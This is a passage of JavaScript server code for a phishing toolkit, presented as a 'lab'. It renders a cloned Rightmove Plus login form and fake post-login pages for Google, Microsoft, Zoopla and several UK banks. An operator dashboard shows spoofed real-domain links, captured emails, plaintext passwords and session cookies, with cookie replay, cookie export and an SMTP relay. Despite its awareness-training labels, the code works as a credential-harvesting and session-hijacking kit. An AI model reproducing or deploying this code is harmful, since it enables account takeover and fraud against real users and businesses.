  return `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" fill-rule="evenodd" clip-rule="evenodd" d="M19.6203 18.2929 4.9132 3.5859 3.4989 5l2.6472 2.6472C3.2883 9.4235 2 12 2 12s3 6 10 6c1.4466 0 2.7223-.2562 3.8361-.6628l2.3699 2.3699c.3906.3906 1.0237.3906 1.4143 0s.3905-1.0237 0-1.4142m-6.3862-3.5577-.7857-.7857A2 2 0 0 1 12 14c-1.1046 0-2-.8954-2-2 0-.1542.0174-.3043.0505-.4484l-.7857-.7857A2.99 2.99 0 0 0 9 12c0 1.6569 1.3431 3 3 3 .4399 0 .8577-.0947 1.2341-.2648M7.6069 9.108l.1872.1872C7.2916 10.0749 7 11.0034 7 12a4.98 4.98 0 0 0 1.1203 3.1542c-.9584-.4509-1.7491-1.0334-2.3887-1.6238A10.7 10.7 0 0 1 4.3659 12c.323-.4411.7763-.9864 1.3657-1.5304.5216-.4815 1.1437-.9577 1.8753-1.3616"/><path fill="currentColor" d="m16.9356 12.8045-6.6757-6.6757A11.6 11.6 0 0 1 12 6c7 0 10 6 10 6s-.83 1.6599-2.6354 3.2336l-1.4181-1.4182q.167-.1418.3219-.285A10.7 10.7 0 0 0 19.6341 12a10.7 10.7 0 0 0-1.3657-1.5304c-.6396-.5904-1.4303-1.173-2.3887-1.6238A4.98 4.98 0 0 1 17 12c0 .2739-.022.5426-.0644.8045"/></svg>`;
}

function phRightmovePage(opts) {
  opts = opts || {};
  const tpl = PH_TEMPLATES['rightmove-plus'] || { display: 'rmplus.rightmove.co.uk' };
  const email = String(opts.email || '');
  const token = phEsc(opts.token || '');
  const errField = opts.errField || '';
  const errMsg = opts.error ? phEsc(opts.error) : '';
  const emailErr = errField === 'email';
  const pwErr = errField === 'password';
  const emailGroup = `<div class="rm-group"><div class="rm-field${emailErr ? ' rm-field--error' : ''}"><input id="email" name="email" type="email" maxlength="100" required autocomplete="username" placeholder="Email" aria-label="Textfield input" aria-placeholder="Email" aria-required="true" value="${phEsc(email)}"></div>${emailErr ? `<p class="rm-support rm-support--error">${errMsg}</p>` : ''}</div>`;
  const pwGroup = `<div class="rm-pwd"><div class="rm-group"><div class="rm-field${pwErr ? ' rm-field--error' : ''}"><input id="password" name="password" type="password" maxlength="100" required autocomplete="current-password" placeholder="Password" aria-label="Textfield input" aria-placeholder="Password" aria-required="true"><button type="button" class="rm-eye" aria-label="Show password" onclick="var b=this,p=document.getElementById('password'),s=p.type==='text';p.type=s?'password':'text';b.classList.toggle('is-shown',!s);b.setAttribute('aria-label',s?'Show password':'Hide password')"><span class="rm-eye-on">${phRightmoveEye(true)}</span><span class="rm-eye-off">${phRightmoveEye(false)}</span></button></div>${pwErr ? `<p class="rm-support rm-support--error">${errMsg}</p>` : ''}</div><a class="rm-forgot" href="#" onclick="return false">Forgot password?</a></div>`;
  const inner = `
  <div class="rm-fs">
    <div class="rm-cc">
      <div class="rm-icon">${phRightmoveHarrow(56)}</div>
      <h1>Welcome to Rightmove Plus</h1>
      <form method="POST" action="/phish/${token}" data-testid="ph-rightmove-login" novalidate>
        ${emailGroup}
        ${pwGroup}
        <button type="submit" class="rm-btn" data-test="login"><span>Continue</span></button>
      </form>
      <div class="rm-hub"><p>Now featuring</p>${phRightmoveLogo()}</div>
    </div>
  </div>`;
  const css = `@font-face{font-family:'Effra';src:url('https://media.rightmove.co.uk/assets/b874c544179368f595e01a3acddb9889/assets/rmplus/fonts/effra/Effra_WLatn_Rg.woff2') format('woff2');font-style:normal;font-weight:400;font-display:swap}@font-face{font-family:'Effra';src:url('https://media.rightmove.co.uk/assets/b874c544179368f595e01a3acddb9889/assets/rmplus/fonts/effra/Effra_WLatn_Md.woff2') format('woff2');font-style:normal;font-weight:500;font-display:swap}html,body{margin:0;padding:0;background:#0f0f2b}body{font-family:'Effra','Segoe UI',-apple-system,BlinkMacSystemFont,'Helvetica Neue',Arial,sans-serif;font-size:14px;line-height:20px;color:#bdbec5;-webkit-font-smoothing:antialiased}.rm-fs{position:absolute;inset:0;display:flex;justify-content:center;align-items:center;background:#0f0f2b;overflow:auto}.rm-cc{box-sizing:border-box;display:flex;flex-direction:column;gap:16px;width:480px;max-width:100%;padding:40px;margin:0 16px}.rm-cc div{margin-top:0;margin-bottom:0}.rm-icon{margin:0 auto;height:40px;width:40px;color:#52e4ce}.rm-icon svg{display:block;width:100%;height:100%}.rm-cc h1{text-align:center;font-size:20px;line-height:28px;letter-spacing:.1px;font-weight:500;color:#fff;margin:0}.rm-cc form{display:flex;flex-direction:column;gap:24px;margin:0}.rm-group{display:flex;flex-direction:column}.rm-field{display:flex;align-items:center;height:48px;width:100%;box-sizing:border-box;background:#9bb9f71f;border:1px solid hsla(0,0%,100%,.4);border-radius:8px}.rm-field:focus-within{outline:1px solid #52e4ce;outline-offset:1px}.rm-field--error{border-color:#f08c8c}.rm-field--error:focus-within{outline-color:#f08c8c}.rm-field input{flex-grow:1;width:100%;background-color:#9bb9f71f;border:1px solid rgba(79,80,100,0);border-radius:8px;font-family:inherit;font-size:16px;line-height:24px;padding:12px;color:#fff;outline:none}.rm-field input:focus-visible{outline:none}.rm-field input::placeholder{color:#bdbec5;opacity:1}.rm-field input:-webkit-autofill{background-clip:text;-webkit-text-fill-color:#fff;box-shadow:inset 0 48px #9bb9f71f;transition:background-color 5s ease-in-out 0s}.rm-eye{background:initial;border:0;cursor:pointer;color:#7de4d3;height:48px;width:48px;flex-shrink:0;padding:0;border-radius:8px;display:inline-flex;align-items:center;justify-content:center;transition-duration:.16s}.rm-eye svg{display:block}.rm-eye .rm-eye-off{display:none}.rm-eye.is-shown .rm-eye-on{display:none}.rm-eye.is-shown .rm-eye-off{display:block}.rm-eye:hover{background-color:#9bb9f714}.rm-eye:focus-visible{outline:2px solid #52e4ce;outline-offset:1px;border-radius:8px}.rm-support{margin:.25rem 0 0;font-size:14px;line-height:20px;color:#bdbec5}.rm-support--error{color:#f08c8c}.rm-pwd{display:flex;flex-direction:column}.rm-forgot{margin-top:.5rem;width:fit-content;align-self:flex-end;text-decoration:none;color:#52e4ce;font-size:14px;line-height:20px;font-weight:400}.rm-forgot:hover{text-decoration:underline}.rm-btn{display:flex;flex-direction:row;justify-content:center;align-items:center;width:100%;height:48px;box-sizing:border-box;background:#2cdebe;border:.125rem solid rgba(0,0,0,0);border-radius:8px;color:#000433;font-family:inherit;font-size:16px;line-height:24px;font-weight:500;cursor:pointer;transition-duration:.16s}.rm-btn:hover:not(:disabled){background:#7de4d3}.rm-btn:active{background:#7de4d3}.rm-btn:focus-visible{outline:2px solid #52e4ce;outline-offset:1px}.rm-btn span{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.rm-hub{display:flex;justify-content:center;align-items:center;flex-direction:column;gap:.5rem}.rm-hub p{margin:0;color:#bdbec5;font-size:14px;line-height:20px}.rm-hub svg{display:block}@media(min-width:768px){.rm-cc{gap:32px}.rm-icon{height:56px;width:56px}.rm-cc h1{font-size:24px;line-height:32px}}@media(max-width:575px){.rm-cc{width:auto;padding:24px;margin:0 12px}.rm-fs{padding:16px 0}}`;
  return phShell('Rightmove Plus', css, inner);
}

// ---------------------------------------------------------------------------
// DEMO POST-LOGIN PAGES (session takeover proof)
// ---------------------------------------------------------------------------
function phAppPage(req, flash) {
  const s = req.phSession;
  const tpl = PH_TEMPLATES[s.template_key] || { name: s.template_key, color: '#666', cookies: [] };
  const names = tpl.cookies.map(function (c) { return '<code>' + phEsc(c.name) + '</code>'; }).join(', ');
  let flashHtml = '';
  if (flash === 'captured') flashHtml = `<div style="background:#fdeceb;border:1px solid #f5c6c2;color:#7a1f18;border-radius:8px;padding:14px 18px;margin-bottom:18px;font-size:14px"><b>🎣 Sesiune capturată (demo).</b> Pagina de test a reținut identitatea și cookie-urile de sesiune (${names}) — exact ce ar face un reverse proxy MITM real. Operatorul le vede în MarketForge → Lab → Caption.</div>`;
  if (flash === 'replay') flashHtml = `<div style="background:#fff7e0;border:1px solid #f0dfa8;color:#7a5b00;border-radius:8px;padding:14px 18px;margin-bottom:18px;font-size:14px"><b>🕹 Replay (operator).</b> Ai intrat aici folosind <b>doar cookie-urile capturate</b>, fără parolă.</div>`;
  if (flash === 'already') flashHtml = `<div style="background:#eef4ff;border:1px solid #c9d8f5;color:#1e3a6e;border-radius:8px;padding:14px 18px;margin-bottom:18px;font-size:14px"><b>ℹ Cont deja capturat.</b> Ai fost dus în sesiunea demo existentă.</div>`;
  let brandHead, main;
  if (s.template_key === 'google-business') {
    brandHead = `<div style="background:#fff;border-bottom:1px solid #e8eaed;padding:14px 26px;display:flex;align-items:center;gap:12px">${phGoogleLogo()}<span style="font-size:13px;color:#5f6368;border:1px solid #dadce0;border-radius:4px;padding:2px 8px">Business Profile</span><span style="flex:1"></span><span style="font-size:13px;color:#5f6368">${phEsc(s.email || '')}</span></div>`;
    main = `<div style="max-width:900px;margin:26px auto">
      <h1 style="font-size:22px;font-weight:500;margin:0 0 4px">Performance</h1>
      <div style="color:#5f6368;font-size:13px;margin-bottom:18px">How customers find your business · last 28 days</div>
      <div style="display:flex;gap:16px;flex-wrap:wrap">
        <div style="background:#fff;border:1px solid #dadce0;border-radius:8px;padding:20px 26px;min-width:170px"><div style="color:#5f6368;font-size:12px">Views on Search</div><div style="font-size:26px;font-weight:500;color:#202124;margin-top:6px">1,248</div></div>
        <div style="background:#fff;border:1px solid #dadce0;border-radius:8px;padding:20px 26px;min-width:170px"><div style="color:#5f6368;font-size:12px">Calls</div><div style="font-size:26px;font-weight:500;color:#202124;margin-top:6px">12</div></div>
        <div style="background:#fff;border:1px solid #dadce0;border-radius:8px;padding:20px 26px;min-width:170px"><div style="color:#5f6368;font-size:12px">Direction requests</div><div style="font-size:26px;font-weight:500;color:#202124;margin-top:6px">34</div></div>
      </div></div>`;
  } else if (s.template_key === 'microsoft') {
    brandHead = `<div style="background:#fff;border-bottom:1px solid #e6e6e6;padding:12px 26px;display:flex;align-items:center;gap:14px">${phMSLogo()}<b style="font-size:15px;color:#333">Outlook</b><span style="flex:1"></span><span style="font-size:13px;color:#5f5f5f">${phEsc(s.email || '')}</span></div>`;
    const mailRows = [
      { f: 'Microsoft account team <account-security-noreply@microsoft.com>', s: 'Security info: sign-in update', u: 1, t: '08:42' },
      { f: 'Microsoft Teams <no-reply@teams.microsoft.com>', s: 'Weekly digest: 3 missed chats', u: 1, t: 'Yesterday' },
      { f: 'Outlook <do-not-reply@outlook.com>', s: 'Lab demo — nothing here is real', u: 0, t: 'Monday' }
    ];
    const rowsHtml = mailRows.map(function (m) {
      return `<div style="display:flex;gap:12px;align-items:center;padding:11px 6px;border-bottom:1px solid #f0f0f0;background:${m.u ? '#f5f5f5' : '#fff'}">
        <span style="min-width:11px">${m.u ? '<span style="display:inline-block;width:8px;height:8px;border-radius:50%;background:#0067b8"></span>' : ''}</span>
        <span style="width:150px;min-width:150px;font-size:13px;color:#1b1b1b;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">${phEsc(m.f)}</span>
        <span style="flex:1;font-size:13px;color:#1b1b1b;white-space:nowrap;overflow:hidden;text-overflow:ellipsis"><b>${phEsc(m.s)}</b></span>
        <span style="font-size:12px;color:#888">${phEsc(m.t)}</span>
      </div>`;
    }).join('');
    main = `<div style="max-width:960px;margin:26px auto">
      <div style="display:flex;align-items:center;gap:10px;margin-bottom:14px"><h1 style="font-size:20px;font-weight:600;color:#1b1b1b;margin:0">Inbox</h1><span style="font-size:12px;color:#888;font-weight:400">(demo)</span></div>
      <div style="background:#fff;border:1px solid #e6e6e6;border-radius:6px;padding:0 14px">${rowsHtml}
        <div style="padding:12px 6px;font-size:12px;color:#888">Mailbox demonstrativ — datele de mai jos nu există în contul real.</div>
      </div></div>`;
  } else if (s.template_key === 'rightmove-plus') {
    brandHead = `<div style="background:#0f0f2b;color:#fff;padding:14px 26px;display:flex;align-items:center;gap:12px">${phRightmoveLogo()}<span style="flex:1"></span><span style="font-size:13px;opacity:.85">${phEsc(s.email || '')}</span></div>`;
    main = `<div style="max-width:900px;margin:26px auto">
      <h1 style="font-size:22px;font-weight:600;margin:0 0 16px">Welcome to Rightmove Plus</h1>
      <div style="display:flex;gap:16px;flex-wrap:wrap">
        <div style="background:#fff;border:1px solid #e2e2e2;border-radius:8px;padding:20px 24px;min-width:180px"><div style="color:#777;font-size:12px">Live listings</div><div style="font-size:26px;font-weight:700;margin-top:6px">24</div></div>
        <div style="background:#fff;border:1px solid #e2e2e2;border-radius:8px;padding:20px 24px;min-width:180px"><div style="color:#777;font-size:12px">New enquiries (7d)</div><div style="font-size:26px;font-weight:700;margin-top:6px">37</div></div>
        <div style="background:#fff;border:1px solid #e2e2e2;border-radius:8px;padding:20px 24px;min-width:180px"><div style="color:#777;font-size:12px">Viewings booked</div><div style="font-size:26px;font-weight:700;margin-top:6px">11</div></div>
      </div></div>`;
  } else if (s.template_key === 'zoopla-pro') {
    brandHead = `<div style="background:#6a148e;color:#fff;padding:14px 26px;display:flex;align-items:center"><span style="font-size:19px;font-weight:800;letter-spacing:-.5px">Zoopla<span style="color:#ffb2d0">Pro</span></span><span style="flex:1"></span><span style="font-size:13px;opacity:.9">${phEsc(s.email || '')}</span></div>`;
    main = `<div style="max-width:900px;margin:26px auto">
      <h1 style="font-size:22px;font-weight:600;margin:0 0 16px">Rental dashboard</h1>
      <div style="display:flex;gap:16px;flex-wrap:wrap">
        <div style="background:#fff;border:1px solid #e2e2e2;border-radius:8px;padding:20px 24px;min-width:180px"><div style="color:#777;font-size:12px">Active listings</div><div style="font-size:26px;font-weight:700;margin-top:6px">18</div></div>
        <div style="background:#fff;border:1px solid #e2e2e2;border-radius:8px;padding:20px 24px;min-width:180px"><div style="color:#777;font-size:12px">New enquiries (7d)</div><div style="font-size:26px;font-weight:700;margin-top:6px">42</div></div>
        <div style="background:#fff;border:1px solid #e2e2e2;border-radius:8px;padding:20px 24px;min-width:180px"><div style="color:#777;font-size:12px">Viewings booked</div><div style="font-size:26px;font-weight:700;margin-top:6px">9</div></div>
      </div></div>`;
  } else {
    const band = s.template_key === 'lloyds' ? '#006a4d' : (s.template_key === 'barclays' ? '#003da5' : '#db0011');
    const brand = s.template_key === 'lloyds' ? 'Lloyds Bank' : (s.template_key === 'barclays' ? 'barclays' : 'HSBC');
    brandHead = `<div style="background:${band};color:#fff;padding:14px 26px;display:flex;align-items:center"><span style="font-size:19px;font-weight:700">${phEsc(brand)}</span><span style="flex:1"></span><span style="font-size:13px;opacity:.9">${phEsc(s.email || '')}</span></div>`;
    main = `<div style="max-width:900px;margin:26px auto">
      <h1 style="font-size:22px;font-weight:600;margin:0 0 16px">Account overview</h1>
      <div style="background:#fff;border:1px solid #e2e2e2;border-radius:8px;padding:20px 24px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px">
        <div><div style="font-weight:600;font-size:15px">LAB Current Account</div><div style="color:#777;font-size:13px;margin-top:4px">Sort code 00-00-00 · Account ••••4321 (demo)</div></div>
        <div style="font-size:22px;font-weight:700">£1,337.00 <span style="font-size:12px;color:#888;font-weight:400">available</span></div>
      </div></div>`;
  }
  const inner = `${brandHead}
  <div style="background:#f5f6f7;min-height:70vh;padding:1px 0 40px">
    <div style="max-width:900px;margin:18px auto 0;padding:0 16px">
      ${flashHtml}
      <div style="background:#10141f;color:#cfd6ea;border:1px solid #2a3352;border-radius:8px;padding:16px 20px;font-size:13.5px;margin-bottom:18px">
        <b style="color:#ffd166">🔬 Panou educațional (LAB)</b> — aceasta este o sesiune demonstrativă creată prin funnel-ul de test. Cookie-urile capturate (${names}) permit preluarea sesiunii fără parolă. Revocarea se face din <b>MarketForge → Lab → Caption → Revocă</b>.
      </div>
      ${main}
      <div style="max-width:900px;margin:22px auto 0"><a href="/phish/signout" style="display:inline-block;background:#fff;border:1px solid #ccc;border-radius:6px;padding:9px 18px;font-size:14px;color:#333;text-decoration:none">Sign out</a></div>
    </div>
  </div>
  <div style="height:40px"></div>`;
  return phShell(tpl.name + ' — Demo session', `body{margin:0;font-family:Arial,Helvetica,sans-serif;color:#111;-webkit-font-smoothing:antialiased}`, inner);
}

// ---------------------------------------------------------------------------
// OPERATOR DASHBOARD PAGES
// ---------------------------------------------------------------------------
function phFlashHtml(key) {
  const map = {
    created: `<div style="background:#e9f7ef;border:1px solid #a7dcbf;color:#14663a;border-radius:8px;padding:12px 16px;margin-bottom:16px;font-size:14px">✓ Campanie creată. Link-ul de test e în tabelul de mai jos.</div>`,
    revoked: `<div style="background:#eef4ff;border:1px solid #c9d8f5;color:#1e3a6e;border-radius:8px;padding:12px 16px;margin-bottom:16px;font-size:14px">✓ Sesiune revocată — cookie-urile capturate nu mai funcționează.</div>`,
    deleted: `<div style="background:#eef4ff;border:1px solid #c9d8f5;color:#1e3a6e;border-radius:8px;padding:12px 16px;margin-bottom:16px;font-size:14px">✓ Captura ștearsă (sesiunea legată a fost revocată).</div>`,
    sent: `<div style="background:#e9f7ef;border:1px solid #a7dcbf;color:#14663a;border-radius:8px;padding:12px 16px;margin-bottom:16px;font-size:14px">✓ Mesaj trimis.</div>`,
    smtpsaved: `<div style="background:#e9f7ef;border:1px solid #a7dcbf;color:#14663a;border-radius:8px;padding:12px 16px;margin-bottom:16px;font-size:14px">✓ Setări SMTP salvate.</div>`
  };
  return map[key] || '';
}

function phDashOverview(req, flash) {
  const user = req.user;
  const camps = db.prepare('SELECT * FROM phish_campaigns WHERE user_id = ? ORDER BY id DESC').all(user.id);
  const campRows = camps.filter(function (c) { return !(PH_TEMPLATES[c.template_key] || {}).rental; }).map(function (c) {
    const tpl = PH_TEMPLATES[c.template_key];
    const live = reqBase(req) + '/phish/' + c.token;
    const spoof = 'https://' + (tpl ? tpl.display : c.template_key) + '/auth/' + c.token;
    return `<tr>
      <td>#${c.id}</td><td>${phTemplateBadge(c.template_key)}</td>
      <td><span style="color:#8f8cb8;font-size:11px;letter-spacing:.4px">LINK AFIȘAT (doar demo) — click = copiază + deschide funnel-ul</span>
        <input readonly onclick="this.select();window.open('${live}','_blank')" value="${phEsc(spoof)}" style="width:100%;max-width:560px;background:#0d0d1a;border:1px solid #333;color:#fff;padding:8px 12px;border-radius:8px;font-size:12.5px;margin-top:4px;cursor:pointer">
        <div style="margin-top:6px;font-size:13px">Funnel real (doar în lab): <a href="${live}" target="_blank" style="color:#8899ff">${live}</a></div></td>
      <td>${phEsc(String(c.created_at || '').substring(0, 16))}</td>
      <td><a class="btn btn-sm btn-danger" href="/dashboard/phishlab/campaign/delete/${c.id}" onclick="return confirm('Ștergi campania #${c.id}? Capturile rămân.')">Șterge</a></td>
    </tr>`;
  }).join('') || `<tr><td colspan="5" style="color:#777;text-align:center;padding:18px">Nicio campanie încă. Alege un template de mai sus.</td></tr>`;
  const cards = Object.keys(PH_TEMPLATES).filter(function (k) { return !PH_TEMPLATES[k].rental; }).map(function (k) {
    const t = PH_TEMPLATES[k];
    const n = camps.filter(function (c) { return c.template_key === k; }).length;
    return `<div style="background:#1a1a2e;border:1px solid #222;border-radius:10px;padding:18px;min-width:230px">
      <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px"><span style="display:inline-block;width:12px;height:12px;border-radius:3px;background:${t.color}"></span><b style="color:#fff;font-size:14.5px">${phEsc(t.name)}</b></div>
      <div style="color:#888;font-size:12px;margin-bottom:6px">${phEsc(t.display)}</div>
      <div style="color:#999;font-size:12px;margin-bottom:6px">Cookie-uri: ${t.cookies.map(function (c) { return '<code style="color:#4CAF50">' + phEsc(c.name) + '</code>'; }).join(' ')}</div>
      <div style="color:#999;font-size:12px;margin-bottom:14px">${n} campanii</div>
      <form method="POST" action="/dashboard/phishlab/campaign/create"><input type="hidden" name="template_key" value="${phEsc(k)}"><button type="submit" class="btn btn-sm btn-primary">+ Campanie nouă</button></form>
    </div>`;
  }).join('');
  const msCard = `<div style="background:#1a1a2e;border:1px dashed #3a3a5e;border-radius:10px;padding:18px;min-width:230px">
    <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px"><span style="display:inline-block;width:12px;height:12px;border-radius:3px;background:#0078D4"></span><b style="color:#fff;font-size:14.5px">Outlook / Microsoft 365</b></div>
    <div style="color:#888;font-size:12px;margin-bottom:6px">outlook.live.com · login.microsoftonline.com</div>
    <div style="color:#999;font-size:12px;margin-bottom:14px">Template-ul „Microsoft Login (Demo)” (cardul de mai sus) are funnel ESTSAUTH/ESTSAUTHPERSISTENT + redirecție reală către Outlook.</div>
    <a class="btn btn-sm btn-primary" href="/dashboard/cloudmail" style="text-decoration:none">Deschide CloudMail 365</a>
  </div>`;
  const content = `<h1>🎣 Lab — Templates</h1>
    ${phFlashHtml(flash)}
    <div style="display:flex;gap:14px;flex-wrap:wrap;margin-bottom:24px">${cards}${msCard}</div>
    <div class="panel"><h3>🔗 Campanii & link-uri de test</h3>
      <table class="data-table"><tr><th>ID</th><th>Template</th><th>Link afișat / Funnel real</th><th>Creat</th><th></th></tr>${campRows}</table>
      <p style="color:#777;font-size:12px;margin-top:12px">Doar în laborator, între membrii echipei. Fiecare deschidere a linkului real creează o intrare în <b>Capturi</b> după trimiterea parolei.</p>
    </div>`;
  return clientPage('Lab', content, user);
}

function phRentalOverview(req, flash) {
  const user = req.user;
  const allCamps = db.prepare('SELECT * FROM phish_campaigns WHERE user_id = ? ORDER BY id DESC').all(user.id);
  const rentalCamps = allCamps.filter(function (c) { return (PH_TEMPLATES[c.template_key] || {}).rental; });
  const campRows = rentalCamps.map(function (c) {
    const tpl = PH_TEMPLATES[c.template_key] || {};
    const live = reqBase(req) + '/phish/' + c.token;
    const spoof = 'https://' + (tpl.display || c.template_key) + '/auth/' + c.token;
    const caps = db.prepare('SELECT COUNT(*) n FROM phish_captures WHERE campaign_id = ?').get(c.id).n;
    return `<tr>
      <td>#${c.id}</td><td>${phTemplateBadge(c.template_key)}</td>
      <td><input readonly onclick="this.select();window.open('${live}','_blank')" value="${phEsc(spoof)}" style="width:100%;max-width:520px;background:#0d0d1a;border:1px solid #333;color:#fff;padding:8px 12px;border-radius:8px;font-size:12.5px;margin-top:4px;cursor:pointer">
        <div style="margin-top:6px;font-size:13px">Funnel real (doar în lab): <a href="${live}" target="_blank" style="color:#8899ff">${live}</a></div></td>
      <td>${caps}</td>
      <td>${phEsc(String(c.created_at || '').substring(0, 16))}</td>
      <td><a class="btn btn-sm btn-danger" href="/dashboard/phishlab/campaign/delete/${c.id}" onclick="return confirm('Ștergi campania #${c.id}?')">Șterge</a></td>
    </tr>`;
  }).join('') || `<tr><td colspan="6" style="color:#777;text-align:center;padding:18px">Nicio campanie de închiriere încă. Alege un template de mai jos.</td></tr>`;
  const rentalTpls = Object.keys(PH_TEMPLATES).filter(function (k) { return PH_TEMPLATES[k].rental; });
  const cards = rentalTpls.map(function (k) {
    const t = PH_TEMPLATES[k];
    const n = allCamps.filter(function (c) { return c.template_key === k; }).length;
    return `<div style="background:#1a1a2e;border:1px solid #2c1d55;border-radius:10px;padding:18px;min-width:250px;max-width:320px">
      <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px"><span style="display:inline-block;width:12px;height:12px;border-radius:3px;background:${t.color}"></span><b style="color:#fff;font-size:14.5px">${phEsc(t.name)}</b></div>
      <div style="color:#888;font-size:12px;margin-bottom:6px">${phEsc(t.display)}</div>
      <div style="color:#999;font-size:12px;margin-bottom:6px">Cookie-uri: ${t.cookies.map(function (c) { return '<code style="color:#c9a3ff">' + phEsc(c.name) + '</code>'; }).join(' ')}</div>
      <div style="color:#999;font-size:12px;margin-bottom:14px">${n} campanii</div>
      <form method="POST" action="/dashboard/phishlab/campaign/create"><input type="hidden" name="template_key" value="${phEsc(k)}"><button type="submit" class="btn btn-sm btn-primary">+ Campanie nouă</button></form>
    </div>`;
  }).join('');

  const content = `<h1>🏠 Rental — Portale de închiriere</h1>
    ${phFlashHtml(flash)}
    <div class="panel" style="margin-bottom:18px">
      <h3>🎯 Scop: awareness anti-phishing pentru agențiile imobiliare</h3>
      <p style="color:#b9aede;font-size:13px;line-height:1.6;margin:0">Agențiile care lucrează cu portale de închiriere (Zoopla Pro, Rightmove) sunt ținte frecvente de phishing prin pagini de login clonate. Această secțiune recrează în sandbox paginile de autentificare reale, pentru a antrena agenții să recunoască atacurile și pentru a testa măsurile de protecție. Fiecare deschidere a unui funnel de test creează o intrare în <b>Caption</b>.</p>
    </div>
    <div style="display:flex;gap:14px;flex-wrap:wrap;margin-bottom:24px">${cards}</div>
    <div class="panel"><h3>🔗 Campanii de test — Rental</h3>
      <table class="data-table"><tr><th>ID</th><th>Template</th><th>Link afișat / Funnel real</th><th>Capturi</th><th>Creat</th><th></th></tr>${campRows}</table>
      <p style="color:#777;font-size:12px;margin-top:12px">Doar în laborator, între membrii echipei. Un template nou se adaugă în <code>PH_TEMPLATES</code> cu flag <code>rental:true</code>.</p>
    </div>`;
  return clientPage('Rental', content, user);
}

function phDashCaptures(req, flash) {
  const user = req.user;
  const rows = db.prepare('SELECT * FROM phish_captures WHERE user_id = ? ORDER BY id DESC').all(user.id);
  const trs = rows.map(function (v) {
    const tpl = PH_TEMPLATES[v.template_key] || { cookies: [] };
    let sessState = '<span style="color:#777">—</span>';
    if (v.session_token) {
      const s = db.prepare('SELECT * FROM phish_sessions WHERE token = ?').get(v.session_token);
      if (!s) sessState = '<span class="status-blocked">sesiune lipsă</span>';
      else if (s.revoked) sessState = '<span class="status-blocked">revocată</span>';
      else if (new Date(String(s.expires_at).replace(' ', 'T')).getTime() <= Date.now()) sessState = '<span class="status-blocked">expirată</span>';
      else sessState = '<span class="status-active">activă</span>';
    }
    const replayBtn = (v.session_token && sessState === '<span class="status-active">activă</span>')
      ? `<a class="btn btn-sm btn-success" href="/dashboard/phishlab/replay/${v.id}">🕹 Replay</a> ` : '<span class="btn btn-sm" style="opacity:.4;pointer-events:none">Replay</span> ';
    const revokeBtn = (v.session_token && sessState === '<span class="status-active">activă</span>')
      ? `<a class="btn btn-sm btn-danger" href="/dashboard/phishlab/revoke/${v.id}">Revocă</a> ` : '';
    const exportBtn = (v.template_key === 'microsoft-proxy' && v.cookies_json)
      ? `<a class="btn btn-sm" href="/dashboard/phishlab/captures/export/${v.id}">⬇ Cookie-uri</a> ` : '';
    let cookieInfo = '—';
    try {
      const cj = JSON.parse(v.cookies_json || '[]');
      if (Array.isArray(cj)) {
        cookieInfo = cj.map(function (c) { return '<code style="color:#4CAF50">' + phEsc(c.name) + '</code>=<span style="color:#666">' + phEsc(String(c.value).substring(0, 8)) + '…</span>'; }).join('<br>');
      } else if (cj && Array.isArray(cj.template) && cj.request) {
        const tplPart = cj.template.map(function (c) { return '<code style="color:#4CAF50">' + phEsc(c.name) + '</code>=<span style="color:#666">' + phEsc(String(c.value).substring(0, 8)) + '…</span>'; }).join('<br>');
        const reqKeys = Object.keys(cj.request);
        cookieInfo = tplPart + (reqKeys.length ? '<div style="color:#8fa7ff;font-size:11px;margin-top:5px">+ browser: <code style="color:#8fa7ff">' + reqKeys.map(function (n) { return phEsc(n); }).join('</code>, <code style="color:#8fa7ff">') + '</code></div>' : '');
      } else if (cj && cj.request) {
        cookieInfo = 'browser: ' + Object.keys(cj.request).map(function (n) { return phEsc(n); }).join(', ');
      }
    } catch (e) {}
    return `<tr>
      <td>#${v.id}</td><td>${phTemplateBadge(v.template_key)}</td>
      <td>${phEsc(v.email || '—')}</td>
      <td>${v.password ? '<code style="color:#c9c6f0;background:#17162b;padding:2px 7px;border-radius:6px;font-size:12px">' + phEsc(v.password) + '</code>' : '<span style="color:#666">—</span>'}</td>
      <td>${cookieInfo}</td><td>${sessState}</td>
      <td>${phEsc(String(v.created_at || '').substring(0, 16))}</td>
      <td style="white-space:nowrap">${replayBtn}${revokeBtn}${exportBtn}<a class="btn btn-sm" href="/dashboard/phishlab/captures/delete/${v.id}" onclick="return confirm('Ștergi captura #${v.id}? Sesiunea legată va fi revocată.')">✕</a></td>
    </tr>`;
  }).join('') || `<tr><td colspan="8" style="color:#777;text-align:center;padding:18px">Nicio captură încă. Trimite un link de test unui coleg.</td></tr>`;
  const content = `<h1>🗂 Caption</h1>
    ${phFlashHtml(flash)}
    <div class="panel">
      <table class="data-table"><tr><th>ID</th><th>Template</th><th>Identitate</th><th>Parolă</th><th>Cookie-uri capturate</th><th>Sesiune</th><th>Creat</th><th></th></tr>${trs}</table>
    </div>`;
  return clientPage('Caption', content, user);
}

// ---------------------------------------------------------------------------
// MAIL LAB (internal + optional SMTP relay)
// ---------------------------------------------------------------------------
function phMailRow(m) {
  return `<div style="border-bottom:1px solid #1a1a2e;padding:12px 6px">
    <div style="display:flex;gap:10px;align-items:baseline;flex-wrap:wrap">
      <b style="color:#ddd;font-size:13.5px">${phEsc(m.subject || '(fără subiect)')}</b>
      <span style="color:#666;font-size:12px">${phEsc(String(m.created_at || '').substring(0, 16))}</span>
      <span style="font-size:11px;border-radius:5px;padding:1px 7px;${m.kind === 'smtp' ? 'background:#17331f;color:#7ddc9a' : 'background:#1a2340;color:#8fa7ff'}">${m.kind === 'smtp' ? 'SMTP relay' : 'intern'}</span>
    </div>
    <div style="color:#777;font-size:12.5px;margin-top:3px">de la ${phEsc(m.from_label || m.from_addr || '—')} · către ${phEsc(m.to_addr || '—')}</div>
    <div style="color:#aaa;font-size:13px;margin-top:6px;white-space:pre-wrap">${phEsc(m.body || '')}</div>
  </div>`;
}

function phMailPage(req, opts) {
  opts = opts || {};
  const user = req.user;
  const mails = db.prepare('SELECT * FROM phish_mails WHERE user_id = ? ORDER BY id DESC LIMIT 50').all(user.id);
  const smtp = db.prepare('SELECT * FROM phish_smtp WHERE user_id = ?').get(user.id);
